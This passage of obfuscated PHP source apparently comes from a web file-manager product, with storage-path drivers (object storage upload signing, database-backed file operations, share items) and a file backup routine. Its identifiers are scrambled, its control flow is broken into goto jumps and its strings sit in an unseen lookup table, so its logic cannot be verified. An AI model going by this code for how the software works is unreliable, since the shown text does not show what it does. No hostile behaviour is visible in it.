$_SERVER[İåâé¾][1181]; } goto B‡Š×¸”ˆÚ; c³´…Ó´¦: $eäôÉ—ß˜ = explode($_SERVER[İåâé¾][223], $fÍñÎŸ»ÆÂ); if (count($eäôÉ—ß˜) < $_SERVER[İåâé¾][1179]) { die; } $cœ¦—¼³“— = $_SERVER[İåâé¾][1180]; goto e®¢Óó‹®‰; B‡Š×¸”ˆÚ: } goto b¢…è™‘°; FØ×Šò‘‘¨: define($_SERVER[İåâé¾][229], 1); define($_SERVER[İåâé¾][230], 2); define($_SERVER[İåâé¾][231], 3); goto Aëó»ùŒ›ğ; EÜàõ»•‹°: class PathDriverCOS extends PathDriverBaseS3 { public function __construct($e©Ôš¥æ–ˆ) { parent::__construct($e©Ôš¥æ–ˆ); $this->signatureVersion($_SERVER[İåâé¾][199]); } public function uploadFormData($b¸ĞÍÈ§µ÷, $A¢ÕÃçÕ²Š = 3600) { goto e’¥¥ÅĞ¼Ö; a‚£›ã¾¸½: return $d…ˆã”Õ›; goto eåĞµË¦£; E±‹»ôË›â: $f•‘ŒÎ¿É = array($F§…³¸˜–§[837] => $Eœ’ÁÆ‹„†, $F§…³¸˜–§[838] => array(array($F§…³¸˜–§[839] => $F†Œ”ø„„Ò), array($F§…³¸˜–§[840] => $this->bucket), array($F§…³¸˜–§[841], $F§…³¸˜–§[842], $F§…³¸˜–§[33]), array($F§…³¸˜–§[843] => $aØ–¥èè‰), array($F§…³¸˜–§[844] => $DÛ“Øì¾©œ), array($F§…³¸˜–§[845] => $this->accessKey), array($F§…³¸˜–§[846] => $fšË±„Ãšµ))); $f•‘ŒÎ¿É = json_encode($f•‘ŒÎ¿É); $cùáéÚ¥¥å = hash_hmac($F§…³¸˜–§[224], $fšË±„Ãšµ, $this->secret); goto A²åºÍÕ¿; bùÓÙæ•–¡: $aØ–¥èè‰ = $F§…³¸˜–§[835]; $Eœ’ÁÆ‹„† = gmdate($F§…³¸˜–§[836], time() + $A¢ÕÃçÕ²Š); $fšË±„Ãšµ = (string) time() . $F§…³¸˜–§[68] . (string) (time() + $A¢ÕÃçÕ²Š); goto E±‹»ôË›â; A²åºÍÕ¿: $bÇ”ˆÊÛË = sha1($f•‘ŒÎ¿É); $A‰÷“ôŸÃØ = hash_hmac($F§…³¸˜–§[224], $bÇ”ˆÊÛË, $cùáéÚ¥¥å); $d…ˆã”Õ› = array($F§…³¸˜–§[839] => $F†Œ”ø„„Ò, $F§…³¸˜–§[843] => $aØ–¥èè‰, $F§…³¸˜–§[847] => base64_encode($f•‘ŒÎ¿É), $F§…³¸˜–§[844] => $DÛ“Øì¾©œ, $F§…³¸˜–§[845] => $this->accessKey, $F§…³¸˜–§[848] => $fšË±„Ãšµ, $F§…³¸˜–§[849] => $A‰÷“ôŸÃØ, $F§…³¸˜–§[165] => $this->getHost()); goto a‚£›ã¾¸½; e’¥¥ÅĞ¼Ö: $F§…³¸˜–§ =& $_SERVER[İåâé¾]; $F†Œ”ø„„Ò = $F§…³¸˜–§[181]; $DÛ“Øì¾©œ = $F§…³¸˜–§[224]; goto bùÓÙæ•–¡; eåĞµË¦£: } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($dªË¨êæ) { $this->pathParse = $dªË¨êæ; $this->model = Model($_SERVER[İåâé¾][850]); } public function getPath($eÍ¹Íá³–‚) { return trim($eÍ¹Íá³–‚, $_SERVER[İåâé¾][8]); } public function pathFather($B¬ŠÅšİÈÅ) { $Dµƒ‡Ç¶„Æ = $this->parse($B¬ŠÅšİÈÅ); $Dµƒ‡Ç¶„Æ = $this->infoSimple($B¬ŠÅšİÈÅ); return $Dµƒ‡Ç¶„Æ ? $Dµƒ‡Ç¶„Æ[$_SERVER[İåâé¾][384]] : !1; } public function getPathName($DÄÅîø‹ğÔ) { $dÛíĞ»îÅÕ = $this->infoSimple($DÄÅîø‹ğÔ); return $dÛíĞ»îÅÕ ? $dÛíĞ»îÅÕ[$_SERVER[İåâé¾][28]] : !1; } public function getPathOuter($eÆŒ´£µÕ) { if (!$eÆŒ´£µÕ) { return $eÆŒ´£µÕ; } $C¢‘°ÒñäÔ = $this->parse($eÆŒ´£µÕ); return KodIO::make($C¢‘°ÒñäÔ[$_SERVER[İåâé¾][368]]); } public function copyFolderFromIO($fË÷§ğ±¸’, $a…ä¼ÖÍÄÄ, $aïÛŸèø„°, $Aø†»éñì, $D‰ÒŠñ‰ØÔ) { $b«›Š•°Š­ = $this->model->copyFolderFromIO($fË÷§ğ±¸’, $a…ä¼ÖÍÄÄ, $aïÛŸèø„°, $Aø†»éñì, $D‰ÒŠñ‰ØÔ); return KodIO::make($b«›Š•°Š­); } public function isParentOf($a¡§—Ï£éŒ, $F£™¥®êÒÕ) { return $this->model->isParentOf($a¡§—Ï£éŒ, $F£™¥®êÒÕ); } public function mkfile($Dí„Òªœ­Ì, $B­˜Úß¬šÂ = '', $c¢Š¤‰ = REPEAT_RENAME) { $A›²Î‹ÆŞÎ =& $_SERVER[İåâé¾]; $DÙ±Ï­‹Í = $this->parse($Dí„Òªœ­Ì); $Dí„Òªœ­Ì = $DÙ±Ï­‹Í[$A›²Î‹ÆŞÎ[368]]; for ($c¶¾–Àƒ– = 0; $c¶¾–Àƒ– < count($DÙ±Ï­‹Í[$A›²Î‹ÆŞÎ[851]]); $c¶¾–Àƒ–++) { $b¼Ö®°Ò = $DÙ±Ï­‹Í[$A›²Î‹ÆŞÎ[851]][$c¶¾–Àƒ–]; $dáİìİÈ = "\x50\x61\x74\x68\104\162\151\166\145\162\104\x42\56\155\x6b\144\x69\162\56{$Dí„Òªœ­Ì}\x2e{$b¼Ö®°Ò}"; CacheLock::lock($dáİìİÈ); if ($c¶¾–Àƒ– == count($DÙ±Ï­‹Í[$A›²Î‹ÆŞÎ[851]]) - 1) { $Dí„Òªœ­Ì = $this->model->mkfile($Dí„Òªœ­Ì, $b¼Ö®°Ò, $B­˜Úß¬šÂ, $c¢Š¤‰); CacheLock::unlock($dáİìİÈ); break; } $Dí„Òªœ­Ì = $this->model->mkdir($Dí„Òªœ­Ì, $b¼Ö®°Ò, REPEAT_SKIP); CacheLock::unlock($dáİìİÈ); } return $this->getPathOuter($Dí„Òªœ­Ì); } public function mkdir($EŸç£ôÆÊÇ, $eò˜ğ¨ôŒÃ = REPEAT_SKIP) { $d‰‚Î½ïÊŸ =& $_SERVER[İåâé¾]; $bò­±çì•¡ = $this->parse($EŸç£ôÆÊÇ); $EŸç£ôÆÊÇ = $bò­±çì•¡[$d‰‚Î½ïÊŸ[368]]; for ($E£¬¾„š£Á = 0; $E£¬¾„š£Á < count($bò­±çì•¡[$d‰‚Î½ïÊŸ[851]]); $E£¬¾„š£Á++) { $A×¬éç¢‡ = $bò­±çì•¡[$d‰‚Î½ïÊŸ[851]][$E£¬¾„š£Á]; $e‘­Ø¼¥ç = "\x50\141\164\x68\104\162\151\x76\x65\x72\x44\102\56\x6d\x6b\144\151\x72\56{$EŸç£ôÆÊÇ}\x2e{$A×¬éç¢‡}"; CacheLock::lock($e‘­Ø¼¥ç); $EŸç£ôÆÊÇ = $this->model->mkdir($EŸç£ôÆÊÇ, $A×¬éç¢‡, $eò˜ğ¨ôŒÃ); CacheLock::unlock($e‘­Ø¼¥ç); } return $this->getPathOuter($EŸç£ôÆÊÇ); } public function copyFile($a…ÆªŞ´Äò, $b¢ÔÄí, $a·™ÙŞÙŒå = REPEAT_REPLACE) { $d˜„†¸œê =& $_SERVER[İåâé¾]; $dÚ„ø…óô = $this->parse($b¢ÔÄí); $A…ğ“–‘¹Ê = $this->model->copy($a…ÆªŞ´Äò, $dÚ„ø…óô[$d˜„†¸œê[368]], $a·™ÙŞÙŒå, $dÚ„ø…óô[$d˜„†¸œê[76]]); return $A…ğ“–‘¹Ê ? $this->getPathOuter($A…ğ“–‘¹Ê) : !1; } public function moveFile($A”›Ù¯Ë½Ğ, $FÂßÛ±ÕÃœ, $E·ôƒº©Œ = REPEAT_REPLACE) { $D·÷„»öÄ¯ =& $_SERVER[İåâé¾]; $eàãôÆËˆ = $this->parse($FÂßÛ±ÕÃœ); $E±ğÊ„åÊš = $this->model->move($A”›Ù¯Ë½Ğ, $eàãôÆËˆ[$D·÷„»öÄ¯[368]], $E·ôƒº©Œ, $eàãôÆËˆ[$D·÷„»öÄ¯[76]]); return $E±ğÊ„åÊš ? $this->getPathOuter($E±ğÊ„åÊš) : !1; } public function copy($déôéÍùæ, $a¢´„®èÈ•, $bÈ‰‚‚ßËâ = REPEAT_REPLACE) { $dÓØ³Â¯”Ş = $this->parse($a¢´„®èÈ•); $FÜáåéø¢ = $this->model->copy($déôéÍùæ, $dÓØ³Â¯”Ş[$_SERVER[İåâé¾][368]], $bÈ‰‚‚ßËâ); return $FÜáåéø¢ ? $this->getPathOuter($FÜáåéø¢) : !1; } public function move($CÊ²¢‘×ä, $bßù—é—ƒç, $EŒ–àËèˆÅ = REPEAT_REPLACE) { $c„•ƒğÌôÀ = $this->parse($bßù—é—ƒç); $BÉŠºöº‰Ø = $this->model->move($CÊ²¢‘×ä, $c„•ƒğÌôÀ[$_SERVER[İåâé¾][368]], $EŒ–àËèˆÅ); return $BÉŠºöº‰Ø ? $this->getPathOuter($BÉŠºöº‰Ø) : !1; } public function remove($EÅ˜Î­­»ƒ, $eêç´‰àÑÓ = true) { return $this->model->remove($EÅ˜Î­­»ƒ, $eêç´‰àÑÓ); } public function rename($A”ÕùÀß¸…, $c—Ã¡òÇêÃ) { $EòËØ¦ùéØ = $this->model->rename($A”ÕùÀß¸…, $c—Ã¡òÇêÃ); return $EòËØ¦ùéØ ? $this->getPathOuter($A”ÕùÀß¸…) : $EòËØ¦ùéØ; } public function size($FÊã•ã¼Á) { $BôŠåµ±­Û = $this->infoSimple($FÊã•ã¼Á); return $BôŠåµ±­Û ? $BôŠåµ±­Û[$_SERVER[İåâé¾][78]] : 0; } public function infoSimple($aˆÇÚ· Õ) { return $this->model->sourceInfo($aˆÇÚ· Õ); } public function info($f×ÇÆàå–š) { return $this->infoParse($f×ÇÆàå–š); } public function infoAuth($e§óº¬ÑÄŒ) { return $this->infoParse($e§óº¬ÑÄŒ, !1, !0); } public function infoWithChildren($eÀìŞ‹¦¶À) { return $this->infoParse($eÀìŞ‹¦¶À, !0); } protected function infoParse($Aä•—ÀŸ, $dÈÅİ®§ = false, $Aö¤’ƒ†¡È = false) { if (!$dÈÅİ®§) { return $this->model->pathInfo($Aä•—ÀŸ, $Aö¤’ƒ†¡È); } return $this->model->pathInfoMore($Aä•—ÀŸ); } public function infoFull($eò–¥ø®®ğ) { $cºåÀïç–– =& $_SERVER[İåâé¾]; $eÎˆíàÙŒŒ = explode($cºåÀïç––[8], $eò–¥ø®®ğ); $cƒ¬èáµåõ = implode($cºåÀïç––[8], array_splice($eÎˆíàÙŒŒ, 1)); return $this->model->pathInfoByPath($eÎˆíàÙŒŒ[0], $cƒ¬èáµåõ); } public function exist($D±´ÅĞ ß‰) { $c±Âññ¤™ =& $_SERVER[İåâé¾]; $bÓªİÊ•œ“ = $this->parse($D±´ÅĞ ß‰); if (!$bÓªİÊ•œ“[$c±Âññ¤™[76]]) { return $this->isFile($D±´ÅĞ ß‰) || $this->isFolder($D±´ÅĞ ß‰); } $AšÒíÊŠâ« = array($c±Âññ¤™[398] => $bÓªİÊ•œ“[$c±Âññ¤™[368]], $c±Âññ¤™[28] => $bÓªİÊ•œ“[$c±Âññ¤™[76]]); $bšŒá«Ü“ñ = $this->model->where($AšÒíÊŠâ«)->find(); return $bšŒá«Ü“ñ ? !0 : !1; } public function isFile($cÉ…ìäõ†á) { $Cò¿¶ä¹Â¾ =& $_SERVER[İåâé¾]; $bÎõçœÉì = $this->infoSimple($cÉ…ìäõ†á); return $bÎõçœÉì && $bÎõçœÉì[$Cò¿¶ä¹Â¾[375]] == $Cò¿¶ä¹Â¾[376] ? !1 : !0; } public function isFolder($cö©¼ò—£é) { $AÕ‡§ŸçÒ° =& $_SERVER[İåâé¾]; $a‹¥¾Ã‰Ä– = $this->infoSimple($cö©¼ò—£é); return $a‹¥¾Ã‰Ä– && $a‹¥¾Ã‰Ä–[$AÕ‡§ŸçÒ°[375]] == $AÕ‡§ŸçÒ°[376] ? !0 : !1; } public function listPath($f…ÆÒŞ›‹, $bÅˆ‘«—ó = false, $CÁ×ôËˆ¨â = false) { $a£’ìŠö±À =& $_SERVER[İåâé¾]; if ($f…ÆÒŞ›‹ == $a£’ìŠö±À[33]) { return !1; } $B§âÈĞôä = array($a£’ìŠö±À[398] => $f…ÆÒŞ›‹); if ($CÁ×ôËˆ¨â) { return $this->model->listSource($B§âÈĞôä, -1); } return $this->model->listSource($B§âÈĞôä); } public function has($D®¿„ƒ–¥, $DØÑ›ˆñ = null) { return $this->model->hasChildren($D®¿„ƒ–¥, $DØÑ›ˆñ); } public function listAll($eòÙÈğ•ä”) { $FÅÖ·Á„Êö = IO::info($this->pathParse[$_SERVER[İåâé¾][76]]); if (!$FÅÖ·Á„Êö) { return array(); } return $this->model->listAll($eòÙÈğ•ä”); } public function getContent($e¬šíº¬Ëß) { return $this->model->getContent($e¬šíº¬Ëß); } public function setContent($fÚ’½¼³óŒ, $DÚÃ”±ƒÂ = '') { return $this->model->setContent($fÚ’½¼³óŒ, $DÚÃ”±ƒÂ); } public function fileSubstr($Fæì…é¼ñ, $F…¬”—ìäÕ, $eó›Ì·²) { return $this->model->fileSubstr($Fæì…é¼ñ, $F…¬”—ìäÕ, $eó›Ì·²); } public function download($CÚ¨™µ•¥Ó, $fŞ¬Ö³Õ¤ñ = '') { $bĞÊ‘Ä‡Ò = $this->model->fileInfoGet($CÚ¨™µ•¥Ó); IO::copy($bĞÊ‘Ä‡Ò[$_SERVER[İåâé¾][76]], $fŞ¬Ö³Õ¤ñ); return $fŞ¬Ö³Õ¤ñ; } public function upload($fµ œ¼˜§ä, $b»“Ì«»Ş‰, $BÚÎŒ…Šª§ = false, $fŠÃÚŒ³áª = REPEAT_REPLACE) { $e¢¯ªƒŸÂ° =& $_SERVER[İåâé¾]; $Dèä¹·Ûì = $this->parse($fµ œ¼˜§ä); $eƒòå‚ƒà‚ = $this->model->addFile($Dèä¹·Ûì[$e¢¯ªƒŸÂ°[368]], $b»“Ì«»Ş‰, $Dèä¹·Ûì[$e¢¯ªƒŸÂ°[76]], $BÚÎŒ…Šª§, $fŠÃÚŒ³áª); return $this->getPathOuter($eƒòå‚ƒà‚); } public function uploadFileByID($F«‘õí•Ä´, $D¥Ş°à¬•§, $EíîÜ¢ôòª) { $B«‹íŸ¼í =& $_SERVER[İåâé¾]; $f…éÌ«Šæ = $this->parse($F«‘õí•Ä´); $EŞŠ±ÙÂÎ± = $this->model->addFileByFileID($f…éÌ«Šæ[$B«‹íŸ¼í[368]], $D¥Ş°à¬•§, $f…éÌ«Šæ[$B«‹íŸ¼í[76]], $EíîÜ¢ôòª); return $this->getPathOuter($EŞŠ±ÙÂÎ±); } public function addFileByRemote($Fî¤¬±èÕ, $eÎÅë´ôÕê, $c§‘âÍã— = array(), $A¹Â†Š×¹ = '', $D‘¢¢ÆÙÏ) { $C•öÍÚÌ‘ =& $_SERVER[İåâé¾]; $Cö³Õ¹Âî× = $this->parse($Fî¤¬±èÕ); $A¹Â†Š×¹ = empty($A¹Â†Š×¹) ? $Cö³Õ¹Âî×[$C•öÍÚÌ‘[76]] : $A¹Â†Š×¹; $d·°Âº†£½ = $this->model->addFileByRemote($Cö³Õ¹Âî×[$C•öÍÚÌ‘[368]], $eÎÅë´ôÕê, $A¹Â†Š×¹, $c§‘âÍã—, $D‘¢¢ÆÙÏ); return $this->getPathOuter($d·°Âº†£½); } public function uploadLink($eÇœĞõª±‘, $eÚõ„£ˆã„ = 0) { $a§¿¾øî‘³ =& $_SERVER[İåâé¾]; $C»ìÌŒ”Ş = $this->parse($eÇœĞõª±‘); $eÇœĞõª±‘ = Model($a§¿¾øî‘³[427])->createFileName($C»ìÌŒ”Ş[$a§¿¾øî‘³[76]]); $f£ËŸÉ­Ø£ = IO::uploadLink($eÇœĞõª±‘, $eÚõ„£ˆã„); return $f£ËŸÉ­Ø£; } public function fileNameAuto($a å†àĞ‘, $Dš¸õ·×›, $D©¹Éåçª¶ = REPEAT_REPLACE, $aŸ”Ä…ò¸ = false) { return $this->model->fileNameAuto($a å†àĞ‘, $Dš¸õ·×›, $D©¹Éåçª¶, $aŸ”Ä…ò¸); } public function fileNameExist($Dğ³†, $D¢„â­±„á) { return $this->model->fileNameExist($Dğ³†, $D¢„â­±„á); } protected function _fileOut($B³¼˜Ë…’ó, $B¦‹ÑÂ½²ä = false, $e“³Ú¯°“Š = false, $CŸ¤—×ô„ = '', $c´ÕŞĞ…— = false) { goto e¶ñš¦Ì£É; e¶ñš¦Ì£É: $e¡¶õƒ©Ş =& $_SERVER[İåâé¾]; $E§Ë’‹…ë = $this->model->sourceInfo($B³¼˜Ë…’ó); if ($E§Ë’‹…ë[$e¡¶õƒ©Ş[375]] == $e¡¶õƒ©Ş[376]) { header($e¡¶õƒ©Ş[852]); die; } goto FãŸèçñ¹; FÏÚÛîÓà: IO::fileOut($bğ–èì£Š®[$e¡¶õƒ©Ş[76]], $B¦‹ÑÂ½²ä, $bğ–èì£Š®[$e¡¶õƒ©Ş[28]], $CŸ¤—×ô„); goto CŸˆó×‹ Á; FãŸèçñ¹: $bğ–èì£Š® = $this->model->fileInfoGet($B³¼˜Ë…’ó); $CŸ¤—×ô„ = $bğ–èì£Š®[$e¡¶õƒ©Ş[159]] ? $bğ–èì£Š®[$e¡¶õƒ©Ş[159]] : $CŸ¤—×ô„; if ($c´ÕŞĞ…—) { return IO::fileOutServer($bğ–èì£Š®[$e¡¶õƒ©Ş[76]], $B¦‹ÑÂ½²ä, $bğ–èì£Š®[$e¡¶õƒ©Ş[28]], $CŸ¤—×ô„); } goto FÏÚÛîÓà; CŸˆó×‹ Á: } public function fileOut($e¢À®îƒè­, $eÆ¿òÓÚÀ = false, $e…¹ù™¢œù = false, $E‡Ì‘±æ±Œ = '') { $this->_fileOut($e¢À®îƒè­, $eÆ¿òÓÚÀ, $e…¹ù™¢œù, $E‡Ì‘±æ±Œ); } public function fileOutServer($f‰ïøÎ†÷, $aŠòíÚ–³¨ = false, $cœÃ¼Ï„¸ˆ = false, $c¾°š¬¼†´ = '') { $this->_fileOut($f‰ïøÎ†÷, $aŠòíÚ–³¨, $cœÃ¼Ï„¸ˆ, $c¾°š¬¼†´, !0); } protected function _fileOutImage($eÆªƒÅõîê, $bÔÆÏ§±Öš = 250) { $Eï¤‡³àô  =& $_SERVER[İåâé¾]; $fÆ°«óİæ = $this->model->sourceInfo($eÆªƒÅõîê); if ($fÆ°«óİæ[$Eï¤‡³àô [375]] == $Eï¤‡³àô [376]) { show_json($Eï¤‡³àô [853] . $eÆªƒÅõîê, !1); } $DÙÂµ‰¦¯² = $this->model->fileInfoGet($eÆªƒÅõîê); IO::fileOutImage($DÙÂµ‰¦¯²[$Eï¤‡³àô [76]], $bÔÆÏ§±Öš); } public function fileOutImage($aìØ³²»æ—, $a‡ÁëÇÑ»È = 250) { $this->_fileOutImage($aìØ³²»æ—, $a‡ÁëÇÑ»È); } public function fileOutImageServer($aÆ©•Ÿİ’é, $D¨çÚ¤ƒô = 250) { $this->_fileOutImage($aÆ©•Ÿİ’é, $D¨çÚ¤ƒô); } public function link($A‹†´˜ó”÷, $Aœœ±ñÚé® = '') { $EÚ†ÒÑ÷ª = $this->model->fileInfoGet($A‹†´˜ó”÷); return IO::link($EÚ†ÒÑ÷ª[$_SERVER[İåâé¾][76]], $Aœœ±ñÚé®); } protected function parse($c¤ó¦‰ÙºŞ) { $eÛğäÛÂğ² =& $_SERVER[İåâé¾]; if (strstr($c¤ó¦‰ÙºŞ, $eÛğäÛÂğ²[8]) === !1) { return array($eÛğäÛÂğ²[812] => intval($c¤ó¦‰ÙºŞ), $eÛğäÛÂğ²[76] => $eÛğäÛÂğ²[33], $eÛğäÛÂğ²[851] => array()); } $EÔÄ»™Á‚ƒ = explode($eÛğäÛÂğ²[8], trim($c¤ó¦‰ÙºŞ, $eÛğäÛÂğ²[8])); if (count($EÔÄ»™Á‚ƒ) < 2) { show_tips($c¤ó¦‰ÙºŞ . $eÛğäÛÂğ²[854]); } return array($eÛğäÛÂğ²[812] => intval($EÔÄ»™Á‚ƒ[0]), $eÛğäÛÂğ²[76] => $EÔÄ»™Á‚ƒ[1], $eÛğäÛÂğ²[851] => array_slice($EÔÄ»™Á‚ƒ, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($C°™¦µùæ•) { $this->pathParse = $C°™¦µùæ•; $this->model = Model($_SERVER[İåâé¾][850]); } public function getPathOuter($DŸÕ½£¿µê) { $A¨¤±ÄÖâó =& $_SERVER[İåâé¾]; if (!$DŸÕ½£¿µê) { return $DŸÕ½£¿µê; } $Bõ„„òñ‡¡ = $this->parse($DŸÕ½£¿µê); return trim(KodIO::makeShare($this->pathParse[$A¨¤±ÄÖâó[368]], $Bõ„„òñ‡¡[$A¨¤±ÄÖâó[368]]), $A¨¤±ÄÖâó[8]); } protected function infoParse($FÓôä¥Šé, $EÈéõÇÍÆÑ = false, $bÂƒé’øõŞ = false) { $c¯Û Ç›¡Ä =& $_SERVER[İåâé¾]; $bì£“¿Ã¤£ = $this->pathParse[$c¯Û Ç›¡Ä[368]]; $bíˆçÄ†›÷ = trim($this->pathParse[$c¯Û Ç›¡Ä[756]], $c¯Û Ç›¡Ä[8]); return Action($c¯Û Ç›¡Ä[855])->sharePathInfo($bì£“¿Ã¤£, $bíˆçÄ†›÷); } public function infoFull($ašºÊ™êË) { return $this->infoParse($ašºÊ™êË); } public function listAll($fÔÃ˜„˜Óš) { goto F¡ ¾…å‰ï; D¿“×ğ¬: $bØæÃ‡§ = $this->model->listAll($fÔÃ˜„˜Óš); $b²—¯èªÏğ = Model($D‘ù§ÜéÅ˜[418])->getInfo($e„Åšø¹ÔÀ[$D‘ù§ÜéÅ˜[419]]); foreach ($bØæÃ‡§ as &$FŞïÔ‘Ò’ù) { check_abort(); $FŞïÔ‘Ò’ù[$D‘ù§ÜéÅ˜[856]] = Action($D‘ù§ÜéÅ˜[855])->_shareItemeParse($FŞïÔ‘Ò’ù[$D‘ù§ÜéÅ˜[856]], $b²—¯èªÏğ); } goto bŞé¿Èêõµ; bŞé¿Èêõµ: return $bØæÃ‡§; goto e¼¾ÉöŒšÙ; F¡ ¾…å‰ï: $D‘ù§ÜéÅ˜ =& $_SERVER[İåâé¾]; $e„Åšø¹ÔÀ = IO::info($this->pathParse[$D‘ù§ÜéÅ˜[76]]); if (!$e„Åšø¹ÔÀ) { return array(); } goto D¿“×ğ¬; e¼¾ÉöŒšÙ: } } goto DŠ²¯µÈ; Aëó»ùŒ›ğ: define($_SERVER[İåâé¾][232], 1); define($_SERVER[İåâé¾][233], 0); define($_SERVER[İåâé¾][234], 2); goto E³³âÍÂ˜; B³Ø„Úƒ®Š: class BackupFile { public function __construct() { } public function index() { goto b¾†à·éŞ›; fĞÒî²©¿: $AßÚÍåØ° = array(); $CÑ“çÀµãÏ = $dÇšÚî™½ = 0; do { $dÖùÑòØÜ = $_SERVER[İåâé¾][509]; $EËë‹ì¤¾‚ = Model($_SERVER[İåâé¾][479])->where($eãÈÌ‹È)->field($dÖùÑòØÜ)->order($_SERVER[İåâé¾][510])->selectPage($b—‹á¿Ñ, $A×¬¢Úß²); $B„’—ÄØˆÖ = !empty($EËë‹ì¤¾‚[$_SERVER[İåâé¾][356]]) ? $EËë‹ì¤¾‚[$_SERVER[İåâé¾][356]] : array(); foreach ($B„’—ÄØˆÖ as $cŸçŸâá²ê) { goto cÎ—Ğ‘ Å÷; cÎ—Ğ‘ Å÷: if (!$this->_fileExist($cŸçŸâá²ê, $AßÚÍåØ°)) { $Cî´ŠğÒİŠ -= 1; $aÀ®É»Ë‘² -= (int) $cŸçŸâá²ê[$_SERVER[İåâé¾][78]]; write_log("\146\x69\154\x65\40\x6e\157\164\x20\145\x78\151\x73\164\56\x66\x69\x6c\145\x49\104\x3a{$cŸçŸâá²ê[$_SERVER[İåâé¾][382]]}\x2c\40\x70\x61\x74\x68\72{$cŸçŸâá²ê[$_SERVER[İåâé¾][76]]}", $_SERVER[İåâé¾][511]); continue; } $bÌªî­Üîë = $cŸçŸâá²ê[$_SERVER[İåâé¾][76]]; $AÈ‚Ö¬á²˜ = str_replace("\173\x69\x6f\72{$cŸçŸâá²ê[$_SERVER[İåâé¾][480]]}\x7d", "\x7b\151\157\x3a{$FˆäôƒÏ ¢[$_SERVER[İåâé¾][448]]}\175", $bÌªî­Üîë); goto cå‡ÄŠ‰Šİ; cå‡ÄŠ‰Šİ: if (IO::exist($AÈ‚Ö¬á²˜)) { $e»–ë¡â¿Æ->updateFileEnd($cŸçŸâá²ê[$_SERVER[İåâé¾][28]], $cŸçŸâá²ê[$_SERVER[İåâé¾][78]]); } else { if (!IO::copy($bÌªî­Üîë, $AÈ‚Ö¬á²˜, $_SERVER[İåâé¾][512])) { write_log($_SERVER[İåâé¾][513] . $bÌªî­Üîë . $_SERVER[İåâé¾][514] . $AÈ‚Ö¬á²˜ . $_SERVER[İåâé¾][515] . $cŸçŸâá²ê[$_SERVER[İåâé¾][28]], $_SERVER[İåâé¾][468]); continue; } } $dò¢¥‘œ±„ = $cŸçŸâá²ê[$_SERVER[İåâé¾][382]]; $FÛÌ×¡•î® += 1; goto B×¡ßĞœÈŠ; B×¡ßĞœÈŠ: $dò§Õë ğ += $cŸçŸâá²ê[$_SERVER[İåâé¾][78]]; $dÇšÚî™½ += 1; $CÑ“çÀµãÏ += $cŸçŸâá²ê[$_SERVER[İåâé¾][78]]; goto aóÒ½õŸöÀ; aóÒ½õŸöÀ: if ($dò§Õë ğ >= 1024 * 1024 * 50) { $b…ŒÙõ£¶È = array($_SERVER[İåâé¾][516] => $dò¢¥‘œ±„, $_SERVER[İåâé¾][517] => $dÇšÚî™½, $_SERVER[İåâé¾][518] => $CÑ“çÀµãÏ); Backup::set($b…ŒÙõ£¶È); $dò§Õë ğ = $FÛÌ×¡•î® = 0; } goto AÉĞİÂÊõŠ; AÉĞİÂÊõŠ: } $cº¿•Ã¾† = count($B„’—ÄØˆÖ); $A×¬¢Úß²++; } while ($cº¿•Ã¾† == $b—‹á¿Ñ); goto B±»Ñçåæ; AÌøï…Ùà‡: $e»–ë¡â¿Æ->task[$_SERVER[İåâé¾][455]] = $aÀ®É»Ë‘²; $b…ŒÙõ£¶È = array($_SERVER[İåâé¾][507] => $Cî´ŠğÒİŠ, $_SERVER[İåâé¾][508] => $aÀ®É»Ë‘²); Backup::set($b…ŒÙõ£¶È); goto c…¶šÌŞÃ‰; Fâ‘¦ÀÃ›: Backup::set($b…ŒÙõ£¶È); $this->_fileFilter($AßÚÍåØ°); return !0; goto bí¯‹³…Î¨; B±»Ñçåæ: $e»–ë¡â¿Æ->end(); $b…ŒÙõ£¶È = array($_SERVER[İåâé¾][519] => 1, $_SERVER[İåâé¾][460] => time(), $_SERVER[İåâé¾][466] => 1, $_SERVER[İåâé¾][516] => $dò¢¥‘œ±„, $_SERVER[İåâé¾][508] => $aÀ®É»Ë‘², $_SERVER[İåâé¾][507] => $Cî´ŠğÒİŠ); if ($FÛÌ×¡•î®) { $b…ŒÙõ£¶È[$_SERVER[İåâé¾][517]] = $dÇšÚî™½; $b…ŒÙõ£¶È[$_SERVER[İåâé¾][518]] = $CÑ“çÀµãÏ; } goto Fâ‘¦ÀÃ›; b¾†à·éŞ›: $FˆäôƒÏ ¢ = Backup::get(); $dò¢¥‘œ±„ = $FˆäôƒÏ ¢[$_SERVER[İåâé¾][284]][$_SERVER[İåâé¾][163]][$_SERVER[İåâé¾][382]]; $eãÈÌ‹È = array($_SERVER[İåâé¾][390] => array($_SERVER[İåâé¾][503], $dò¢¥‘œ±„), $_SERVER[İåâé¾][504] => array($_SERVER[İåâé¾][322], $FˆäôƒÏ ¢[$_SERVER[İåâé¾][448]])); goto FÁñ÷—ì‰; c…¶šÌŞÃ‰: $A×¬¢Úß² = 1; $b—‹á¿Ñ = 1000; $dò§Õë ğ = $FÛÌ×¡•î® = 0; goto fĞÒî²©¿; FÁñ÷—ì‰: $Cî´ŠğÒİŠ = (int) Model($_SERVER[İåâé¾][479])->where($eãÈÌ‹È)->count($_SERVER[İåâé¾][382]); $aÀ®É»Ë‘² = (int) Model($_SERVER[İåâé¾][479])->where($eãÈÌ‹È)->sum($_SERVER[İåâé¾][78]); $e»–ë¡â¿Æ = new TaskFileTransfer($_SERVER[İåâé¾][505], $_SERVER[İåâé¾][468], $Cî´ŠğÒİŠ, LNG($_SERVER[İåâé¾][469]) . $_SERVER[İåâé¾][470] . LNG($_SERVER[İåâé¾][506])); goto AÌøï…Ùà‡; bí¯‹³…Î¨: } private function _fileExist($c¸Œ‚ÈÃØÔ, &$aãË¦Æö”) { goto Bõ®ŠÜ²¬Ş; Bõ®ŠÜ²¬Ş: $cİË…‘ö˜ =& $_SERVER[İåâé¾]; $CËµº½Âƒ = $c¸Œ‚ÈÃØÔ[$cİË…‘ö˜[76]]; if (in_array($c¸Œ‚ÈÃØÔ[$cİË…‘ö˜[382]], $aãË¦Æö”)) { return !1; } goto B´…¿ƒŒƒÍ; eˆéË†®ïÛ: $E´ƒÔÂÛŠ = array($cİË…‘ö˜[480] => $c¸Œ‚ÈÃØÔ[$cİË…‘ö˜[480]], $cİË…‘ö˜[76] => array($cİË…‘ö˜[520], "{$BÍ ¤ÇÃø}\45")); $FßÚë“³¸ = Model($cİË…‘ö˜[479])->where($E´ƒÔÂÛŠ)->field($cİË…‘ö˜[390])->select(); $aãË¦Æö” = array_merge($aãË¦Æö”, 